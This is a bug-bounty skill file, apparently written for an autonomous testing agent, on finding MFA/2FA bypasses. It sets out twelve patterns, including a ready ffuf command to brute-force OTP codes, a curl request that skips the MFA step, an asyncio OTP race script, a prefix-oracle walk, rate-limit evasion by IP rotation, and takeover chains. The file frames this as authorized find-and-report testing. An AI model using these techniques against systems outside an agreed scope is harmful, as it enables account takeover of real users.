---
name: hunt-mfa-bypass
description: "Hunt MFA / 2FA bypass — 12 patterns. (1) no rate limit on OTP verify (10^6 keyspace), (2) OTP not invalidated after use, (3) response manipulation (client-side check), (4) skip the MFA step via direct navigation with the pre-MFA session, (5) race on OTP validation, (6) backup-code brute force, (7) remember-device cookie not bound, (8) passkeys / WebAuthn (origin / rpId checks, none attestation, stale related origins, challenge replay, fallback downgrade), (9) push fatigue / no number matching, (10) MFA enrollment from a pre-MFA session, (11) TOTP skew-window reuse, (12) SSO / OAuth login path skipping local MFA. Chain: cookie theft + password oracle + no step-up = ATO. Detection: trace auth flow in Burp, find every state transition, check if MFA is middleware-gated vs per-endpoint, check OTP entropy and rate limit on OTP-validate. Validate: attacker session reaching post-MFA state. Use when hunting auth bypass, MFA flows, passkey deployments, chaining primitives toward ATO."
metadata:
  sources: hackerone_public, cve_database, nist_800_63b, public_research
  report_count: 5
---

> Authorized testing only: run this against assets you own or that a signed scope or a program's in-scope list names. It is a find-and-report methodology, not a weapon.

## Autonomous Testing Priority

**Try workflow bypasses before brute force — they're faster and more likely to succeed.**

**Pattern A — Skip the MFA step entirely (most automatable):**
1. Login with valid credentials → receive a "pre-MFA" session state
2. Without completing MFA, directly access a protected resource (`/dashboard`, `/api/me`, `/account/profile`)
3. If the response returns user data → MFA is enforced only in the UI, not server-side = Critical

**Pattern B — OTP replay (reuse a consumed code):**
1. Complete a valid MFA flow to get a working OTP
2. Log out, log in again with the same credentials
3. Submit the same OTP again
4. If accepted → OTP is not invalidated after use

**Pattern C — Submit obviously wrong OTP, observe response:**
Try submitting `000000` or `123456`. If the response is 200 or returns a session token, OTP validation is broken or client-side only.

**Pattern D — Partial / incremental validation (prefix oracle):**
If a guessed full code is rejected, test whether the server validates the OTP **prefix-by-prefix** instead of all-or-nothing. Submit a short partial code and compare responses:
1. Submit a 1–3 digit value (e.g. `otp=1`, then `otp=12`, …) — for a POST verify endpoint the code goes in the **request body**, not the URL query string, or the server reads an empty value.
2. If a *correct* prefix gives a DIFFERENT response than a wrong one (a success/flag, a distinct message, or a different length/timing), the validator leaks correctness one chunk at a time.
3. Walk the code digit-by-digit: keep the prefix that "responds correct," append 0–9, repeat. This collapses 10^6 brute force to ~10×N guesses (≤60 for a 6-digit code) — very feasible in a bounded test.
This is the go-to when there is no leaked code and no skip/replay path. Some apps award success on *any* correct prefix outright (so a single correct first digit can win — sweep `otp=0,1,…,9` before giving up).
**CRITICAL — stay in ONE session:** re-authenticating (POST /…/login again) regenerates the OTP, throwing away your prefix progress. Do the entire sweep against a single established MFA session; never re-login between guesses.

**On full brute force:** brute-forcing all 10^6 codes is infeasible in a bounded test — but the prefix oracle above (Pattern D) usually makes it unnecessary. Only attempt full brute force with evidence of no rate limit AND a small key space.

**Proof:** A session token or protected resource data in the response without completing MFA confirms the bypass.

---

## MFA / 2FA BYPASS
> Growing bug class — 12 distinct patterns. Pays High/Critical when it enables ATO without prior session.

### Pattern 1: No Rate Limit on OTP
```bash
# Test with ffuf — all 1M 6-digit codes
ffuf -u "https://target.example/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
# -t 5 (slow down) — aggressive rates get 429 or ban
```

### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
```

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
# Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
# If app grants access without MFA = auth flow bypass = Critical
curl -s -b "session=PRE_MFA_SESSION" https://target.example/dashboard
```

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.example/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
        # window before the server marks it used. Two requests are NOT enough —
        # they almost always resolve sequentially as "already-used" (false negative).
        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
        # Race confirmed if >1 success (or 1 success among many "already-used").
        for status, body in results:
            print(status, body)
asyncio.run(race())
```

### Pattern 6: Backup Code Brute Force
```
Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
```

### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```

### Pattern 8: Passkeys / WebAuthn
Passkeys are phishing-resistant only if the relying party (RP) checks what the authenticator signed and removes the weaker factors. Test with your own test credential; a software or virtual authenticator (Chrome DevTools → WebAuthn panel) lets you produce assertions you control.
```
Origin / rpId     RP must check clientDataJSON.origin and the rpIdHash in authenticatorData.
                  Submit an assertion made for another origin (http scheme, sibling subdomain,
                  trailing dot, explicit :443, crossOrigin:true). Accepted = phishing resistance gone.
Attestation       Register with fmt "none" or self attestation. Only a finding where the RP's
                  policy claims certified / hardware-bound authenticators (enterprise, high-assurance).
Related origins   GET https://<rpId>/.well-known/webauthn → every entry in "origins" must be a host
                  the org still controls. A lapsed domain or takeoverable subdomain in that list can
                  run ceremonies for the RP ID (chain with hunt-subdomain).
Challenge replay  Replay a captured assertion, or reuse one challenge across two logins. The RP must
                  reject any challenge it already accepted, and challenges must be random and
                  bound to the session.
User verification Requesting UV in the options is not verifying it: send an assertion with the UV
                  flag clear and check the RP still enforces it where it claims to.
Fallback downgrade After enrolling a passkey, check whether password + SMS / TOTP / email OTP still
                  logs the same account in. If it does, an attacker phishes the weaker path.
```
Severity: origin/rpId or challenge-replay acceptance is High (it breaks the core guarantee). A kept fallback factor is usually Low–Medium on its own unless the program sells the account as passkey-only; report it as the precondition for a phishing ATO (`hunt-ato`). Methodology sources: [Heringer, Pentesting Passkeys](https://niklas-heringer.com/penetration-testing/pentesting-passkeys-a-practical-methodology-for-webauthn-deployments/), [pentest-book WebAuthn & Passkeys](https://github.com/six2dez/pentest-book/blob/master/others/webauthn-passkeys.md), [web.dev Related Origin Requests](https://web.dev/articles/webauthn-related-origin-requests).

### Pattern 9: Push Fatigue / No Number Matching
```
1. On YOUR test account, start a login with the correct password → push prompt arrives
2. Is the prompt approve/deny only, with no number to type from the login screen? (no number matching)
3. Repeat the login a handful of times: are pushes rate-limited or blocked after N denials?
Approve-only push + unlimited prompts = MFA fatigue exposure. Never send prompts to real users.
```

### Pattern 10: MFA Enrollment From a Pre-MFA Session
```
1. Account already has MFA. Log in with password only → stop at the MFA prompt (pre-MFA session)
2. With that session, call the factor-management endpoints (/mfa/enroll, /api/2fa/setup, add-phone,
   reset-authenticator)
3. If a NEW TOTP secret / phone / security key can be added or the existing one replaced
   → attacker with the password swaps in their own factor = full MFA bypass
Also test enrollment / factor removal from a full session with no re-auth or step-up.
```

### Pattern 11: TOTP Skew-Window Reuse
```
RFC 6238 §5.2: at most one time step of network delay is RECOMMENDED, and the verifier MUST NOT
accept the second attempt of an OTP after it was validated once.
1. Use a TOTP code from YOUR authenticator → success
2. Submit the same code again within the same 30 s step (new login) → accepted = replay
3. Using your own enrolment secret, submit codes for steps -3..+3 → count how many are accepted.
   More than ±1 step widens both the replay and the brute-force window.
```

### Pattern 12: SSO / OAuth Login Path Skips Local MFA
```
1. App enforces its own MFA for password logins
2. Link your test account to "Sign in with Google / Microsoft / SAML" and log in that way
3. Full session issued with no local MFA step, and the app does not check the IdP's amr / acr
   claims for MFA → MFA is only on one door. Also try mobile / legacy API login endpoints.
Chain with hunt-oauth / hunt-saml when the IdP side is weak.
```

### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Response manipulation = client-side only check = Critical
Skip MFA step = auth flow bypass = Critical
OTP reuse = persistent session hijack = High
MFA enrollment from pre-MFA session = factor replacement = Critical
Passkey origin / challenge replay accepted = High; fallback factor kept = precondition for phishing ATO
```

---

## Related Skills & Chains

- **`hunt-ato`** — MFA bypass is a primitive; ATO is the destination. Chain primitive: cookie theft (via XSS or session-fixation) + password oracle (login response timing/length diff reveals valid passwords without lockout) + no MFA step-up on password-change endpoint = persistent ATO without ever facing the OTP challenge → password rotated, attacker locks victim out.
- **`hunt-race-condition`** — Pattern 5 (OTP race) lives in race-condition territory; load both skills together. Chain primitive: same 6-digit OTP submitted via 20 parallel HTTP/2 streams (single-packet Turbo Intruder attack) before the server marks it used → 1 success + 19 "already-used" → race window confirmed → attacker doesn't need to brute, just guesses once and parallelizes → ATO.
- **`hunt-auth-bypass`** — MFA-step-skip is auth-flow bypass at the workflow layer. Chain primitive: pre-MFA cookie issued after password step + direct navigation to `/dashboard` skipping `/mfa` route + server only middleware-gates `/mfa` not `/dashboard` = full post-auth access from password-only state → MFA never enforced because the route gate was misplaced.
- **`hunt-misc`** — Recovery-code dump via `/api/me` is a misc-class info disclosure that becomes Critical when chained. Chain primitive: `/api/me` returns full user object including `backup_codes` array (plaintext, never rotated) → attacker with any read-IDOR or XSS exfils backup codes → uses one backup code → MFA satisfied → ATO without OTP knowledge.
- **`security-arsenal`** — Pull the OTP-brute-force payload section (000000-999999 wordlist generator, ffuf rate-limit-evasion patterns with `-t 5 -p 0.5-2`, distributed-IP rotation via proxychains) and the JWT-token-replay table when "MFA satisfied" claim lives in a JWT claim that can be forged.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an MFA bypass that only works when the attacker already has the password. Standalone MFA bypass is High; chained-with-password-oracle is Critical; chained-with-cookie-theft-only is Critical. The chain question separates the two.

